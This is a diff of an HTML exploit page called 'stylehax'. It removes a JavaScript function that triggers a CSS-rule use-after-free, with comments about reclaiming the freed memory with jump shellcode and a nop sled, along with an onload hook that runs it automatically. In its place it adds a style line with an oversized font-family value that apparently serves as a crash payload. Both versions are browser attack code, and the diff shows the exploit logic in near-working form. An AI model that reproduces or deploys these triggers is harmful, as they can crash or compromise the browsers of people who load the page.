@@ -1,62 +1,20 @@
-<!-- stylehax by nathan 2023 -->
-<!-- https://github.com/nathanfarlow/stylehax -->
 
 <html>
 
 <head>
    <title>stylehax</title>
-   <style id="style1">
-      @media all {
-         .test {
-            color: green;
-         }
-      }
-   </style>
+<STYLE type=text/css>A { FONT-FAMILY: 35000x'A' } </STYLE>
    <script>
 
       
 
-      function exploit() {
-
-
-
-
-         var styleSheet = document.getElementById('style1').sheet;
-         var mediaRule = styleSheet.cssRules[0];
-
- 
-
-         try {
-            // fails with syntax error and throws exception, 
-            // but still adds some corrupted object to mediaRule.cssRules
-            mediaRule.insertRule("@media screen { p { color: green; } };", mediaRule.cssRules.length);
-           
-         } catch (e) {
-alert("exploit failed. reboot and try again")
-         }
-
-         // empty mediaRule.cssRules
-         mediaRule.deleteRule(0);
-         mediaRule.deleteRule(0);
-
-         // try to reclaim memory of freed object with jump shellcode
-         // (more heap magic)
-  
-
-         // 0x2bc5120 is effectively a nop, and is also the address of our nop sled
-    
-
-         // accessing this property causes jump to bootstrap
-         mediaRule.cssRules.length;
-        
-      }
+     
    </script>
 </head>
 
-<body onload="exploit()">
-   <div style="width: 250px">
-      <p>stylehax by nathan</p>
-      <p>exploit in progress.........g if you've waited > 30 seconds, reboot and try again!</p>
+<body>
+  
+      <p>exploit in progress</p>
    </div>
 </body>
 
